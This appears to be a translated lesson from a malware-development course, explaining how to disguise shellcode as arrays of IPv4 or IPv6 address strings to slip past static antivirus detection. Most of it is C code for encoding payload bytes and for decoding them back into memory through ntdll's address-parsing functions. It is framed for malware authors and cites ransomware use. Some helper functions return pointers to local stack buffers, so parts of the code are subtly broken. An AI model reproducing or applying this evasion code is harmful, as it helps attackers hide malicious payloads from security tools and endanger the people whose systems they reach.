模块 21 - 有效载荷混淆 - IPv4 与 IPv6 混淆

在学习此阶段时，学习者应掌握有效负荷加密的基础知识。本模块将探索另一种使用有效负荷混淆的方法，以规避静态检测。

恶意软件开发人员需要掌握各种工具，以便实现同一任务，从而保持不可预测性。与有效负荷加密相比，有效负荷混淆可视为另一种“工具”，但二者的最终目的是相同的。

在本模块结束时，学习者应能够使用高级有效负荷混淆技术，其中一些技术已在实际环境中使用，例如 Hive 勒索软件 中。

本模块和后续模块中显示的代码应以发布模式进行编译。在调试模式下编译会导致二进制文件无法正常工作。

IPv4/IPv6 混淆

IPv4/IPv6 混淆是一种混淆技术，它将 shellcode 的字节转换为 IPv4 或 IPv6 字符串。让我们使用一些来自 Msfvenom x64 calc shellcode 的字节，分析它们如何转换为 IPv4 或 IPv6 字符串。对于此示例，使用了以下字节：

FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51。

  • IPv4 混淆- 由于 IPv4 地址由 4 个八位字节组成，IPv4 混淆使用 4 个字节生成一个 IPv4 字符串，每个字节表示一个八位字节。以十进制格式获取每个当前为十六进制的字节，以获取一个八位字节。使用上述字节作为示例，FC 在十进制中为 252，48 为 72，83 为 131，E4 为 228。因此，示例 shellcode 的前 4 个字节 FC 48 83 E4 将为 252.72.131.228。
  • IPv6 混淆- 这将采用与 IPv4 混淆示例类似的逻辑，但不是每个 IP 地址使用 4 个字节，而是使用 16 个字节生成一个 IPv6 地址。此外，IPv6 地址不要求将字节转换为十进制格式。以示例 shellcode 为例，它将为 FC48:83E4:F0E8:C000:0000:4151:4150:5251。

IPv4 模糊处理的实现

在解释了逻辑之后，本部分将深入探讨 IPv4 模糊处理的实现。以下是代码段的几个要点：

  • 如前所述，生成一个 IPv4 地址需要 4 个字节，因此 shellcode 必须是 4 的倍数。如果你不满足这个要求，你可以创建一个用于填充 shellcode 的函数。模糊处理模块中的填充问题将在即将推出的 HellShell 模块中得到解决。
  • GenerateIpv4 是一个辅助函数，它采用 4 个 shellcode 字节，并使用 sprintf 生成 IPv4 地址。
  • 最后，这段代码只涵盖了模糊处理，而反模糊处理将在模块后面解释。
// 函数采用 4 个原始字节，并以 IPv4 字符串格式返回它们
char* GenerateIpv4(int a, int b, int c, int d) {
    unsigned char Output [32];

    // 创建 IPv4 地址并将其保存到 'Output' 变量中
    sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

    // 可选：将 'Output' 变量打印到控制台中
    // printf("[i] Output: %s\n", Output);

    return (char*)Output;
}


// 生成 shellcode 的 IPv4 输出表示
// 函数需要指向 shellcode 缓冲区的指针或基地址以及 shellcode 缓冲区的大小
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

    // 如果 shellcode 缓冲区为空或大小不是 4 的倍数，则退出
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
        return FALSE;
    }
    printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

    // 我们将一次读取一个 shellcode 字节，当总数为 4 时，开始生成 IPv4 地址
    // 变量 'c' 用于存储读取的字节数。默认情况下，从 4 开始。
    int c = 4, counter = 0;
    char* IP = NULL;

    for (int i = 0; i < ShellcodeSize; i++) {

        // 跟踪读取的字节数，当它们达到 4 时，我们进入此 if 语句以开始生成 IPv4 地址
        if (c == 4) {
            counter++;

            // 从从 i 到 [i + 3] 开始的 4 个字节生成 IPv4 地址
            IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

            if (i == ShellcodeSize - 4) {
                // 打印最后一个 IPv4 地址
                printf("\"%s\"", IP);
                break;
            }
            else {
                // 打印 IPv4 地址
                printf("\"%s\", ", IP);
            }

            c = 1;

            // 可选：设置输出在控制台上的显示效果
            if (counter % 8 == 0) {
                printf("\n\t");
            }
        }
        else {
            c++;
        }
    }
    printf("\n};\n\n");
    return TRUE;
}

IPv6 混淆实现

使用 IPv6 混淆时，Shellcode 应为 16 的倍数。同样，如果 Shellcode 不满足此要求，也可以创建一个对其填充的函数。

// 该函数接受 16 个原始字节，并以 IPv6 地址字符串格式返回它们
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

    // 每个 IPv6 段为 32 字节
    char Output0[32], Output1[32], Output2[32], Output3[32];

    // IPv6 中有 4 个段（32 * 4 = 128）
    char result[128];

    // 使用前 4 个字节生成 output0
    sprintf(Output0, "%0.2X%0.2X:%0.2X%0.2X", a, b, c, d);

    // 使用第二个 4 个字节生成 output1
    sprintf(Output1, "%0.2X%0.2X:%0.2X%0.2X", e, f, g, h);

    // 使用第三个 4 个字节生成 output2
    sprintf(Output2, "%0.2X%0.2X:%0.2X%0.2X", i, j, k, l);

    // 使用最后一个 4 个字节生成 output3
    sprintf(Output3, "%0.2X%0.2X:%0.2X%0.2X", m, n, o, p);

    // 将 Output0、1、2、3 组合起来生成 IPv6 地址
    sprintf(result, "%s:%s:%s:%s", Output0, Output1, Output2, Output3);

    // 可选：将“result”变量打印到控制台
    // printf("[i] result: %s\n", (char*)result);

    return (char*)result;
}


// 生成 Shellcode 的 IPv6 输出表示形式
// 该函数需要指向 Shellcode 缓冲区的指针或基地址以及 Shellcode 缓冲区的大小
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // 如果 Shellcode 缓冲区为空或大小不是 16 的倍数，则退出
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0){
        return FALSE;
    }
    printf("char* Ipv6Array [%d] = { \n\t", (int)(ShellcodeSize / 16));

    // 我们将一次读取一个 Shellcode 字节，当总数达到 16 时，开始生成 IPv6 地址
    // 变量“c”用于存储已读取的字节数。默认情况下，从 16 开始。
    int c = 16, counter = 0;
    char* IP = NULL;

    for (int i = 0; i < ShellcodeSize; i++) {
        // 跟踪已读取的字节数，当它们达到 16 时，我们进入此 if 语句以开始生成 IPv6 地址
        if (c == 16) {
            counter++;

            // 从第 i 个字节开始到 [i + 15] 为止，从 16 个字节生成 IPv6 地址
            IP = GenerateIpv6(
                pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
                pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
                pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
                pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
            );
            if (i == ShellcodeSize - 16) {

                // 打印最后一个 IPv6 地址
                printf("\"%s\"", IP);
                break;
            }
            else {
                // 打印 IPv6 地址
                printf("\"%s\", ", IP);
            }
            c = 1;

            // 可选：美化控制台输出
            if (counter % 3 == 0) {
                printf("\n\t");
            }
        }
        else {
            c++;
        }
    }
    printf("\n};\n\n");
    return TRUE;
}

IPv4/IPv6 解混淆

经过混淆处理的有效载荷绕过静态检测后，就需要对其进行解混淆处理才能执行。解混淆处理是一种逆混淆过程，能够让 IP 地址生成字节，而不是使用字节来生成 IP 地址。执行解混淆需要以下内容：

  • IPv4 解混淆 - 这需要使用 NTAPI RtlIpv4StringToAddressA。该 API 将 IPv4 地址的字符串表示形式转换为二进制 IPv4 地址。
  • IPv6 解混淆 - 与上个函数类似，IPv6 解混淆需要用到另一个 NTAPI RtlIpv6StringToAddressA。该函数将 IPv6 地址转换为二进制 IPv6 地址。

解混淆 IPv4Fuscation Payload

Ipv4Deobfuscation 函数以一个 Ipv4Array 作为第一个参数，其中包含一组 IPv4 地址。第二个参数是 NmbrOfElements，意为 Ipv4Array 数组中的 IPv4 地址数量，以便循环遍历数组的大小。最后两个参数 ppDAddress 和 pDSize 将分别用于存储去混淆的有效负载及其大小。

去混淆过程首先使用 GetProcAddress 和 GetModuleHandle 获取 RtlIpv4StringToAddressA 的地址。接下来，分配一个缓冲区，该缓冲区最终将存储大小为 NmbrOfElements * 4 的去混淆有效负载。这种大小的考虑是基于这样一个事实：每个 IPv4 地址将生成 4 个字节。

转到 for 循环，它首先定义一个新变量 TmpBuffer，并将其设置为等于 pBuffer。接下来，TmpBuffer 作为第四个参数传递给 RtlIpv4StringToAddressA，这将存储 IPv4 地址的二进制表示形式。RtlIpv4StringToAddressA 函数将向 TmpBuffer 缓冲区写入 4 个字节，因此 TmpBuffer 在之后增加 4，以便允许将接下来的 4 个字节写入其中而不覆盖之前的字节。

最后，ppDAddress 和 pDSize 被设置为包含去混淆有效负载的基址及其大小。

typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR       S,
    BOOLEAN     Strict,
    PCSTR*      Terminator,
    PVOID       Addr
);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    PBYTE           pBuffer                 = NULL, 
    TmpBuffer               = NULL;
    SIZE_T          sBuffSize               = NULL;
    PCSTR           Terminator              = NULL;
    NTSTATUS        STATUS                  = NULL;
    // 从 ntdll.dll 中获取 RtlIpv4StringToAddressA 地址
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
    if (pRtlIpv4StringToAddressA == NULL){
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // 获取 shellcode 的实际大小，即 IPv4 地址的数量 * 4
    sBuffSize = NmbrOfElements * 4;

    // 分配将容纳去混淆 shellcode 的内存
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL){
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // 设置 TmpBuffer 等于 pBuffer
    TmpBuffer = pBuffer;

    // 循环遍历存储在 Ipv4Array 中的所有 IPv4 地址
    for (int i = 0; i < NmbrOfElements; i++) {

        // 一次去混淆一个 IPv4 地址
        // Ipv4Array[i] 是数组 Ipv4Array 中的单个 ipv4 地址
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
            // 如果失败
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
            return FALSE;
        }

        // 每次向 TmpBuffer 中写入 4 个字节
        // 因此 Tmpbuffer 将增加 4 以存储即将到来的 4 个字节
        TmpBuffer = (PBYTE)(TmpBuffer + 4);

    }

    // 保存去混淆有效负载的基址和大小
    *ppDAddress     = pBuffer;
    *pDSize         = sBuffSize;

    return TRUE;
}

解混淆 IPv6Fuscation Payload

除了以下两个主要差异，IPv6 的解混淆处理过程与 IPv4 相同：

  1. 使用 RtlIpv6StringToAddressA 代替 RtlIpv4StringToAddressA。
  2. 每个 IPv6 地址解混淆成 16 个字节，而不是 4 个字节。
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR       S,
    PCSTR*      Terminator,
    PVOID       Addr
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;

    SIZE_T          sBuffSize               = NULL;

    PCSTR           Terminator              = NULL;

    NTSTATUS        STATUS                  = NULL;

    // 从 ntdll.dll 获取 RtlIpv6StringToAddressA 地址
    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress 失败，错误代码为：%d \n", GetLastError());
        return FALSE;
    }

    // 获取 shellcode 的实际大小，即 IPv6 地址数 * 16
    sBuffSize = NmbrOfElements * 16;


    // 分配内存来保存解混淆的 shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc 失败，错误代码为：%d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // 遍历 Ipv6Array 中保存的所有 IPv6 地址
    for (int i = 0; i < NmbrOfElements; i++) {

        // 一次解混淆一个 IPv6 地址
        // Ipv6Array[i] 是 Ipv6Array 数组中的单个 IPv6 地址
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
            // 如果解混淆失败
            printf("[!] RtlIpv6StringToAddressA 在 [%s] 失败，错误代码为：0x%0.8X", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // 一次写入 16 个字节到 TmpBuffer
        // 因此，Tmpbuffer 将增加 16 来存储即将到来的 16 个字节
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    // 保存解混淆有效负载的基地址和大小
    *ppDAddress  = pBuffer;
    *pDSize      = sBuffSize;

    return TRUE;

}
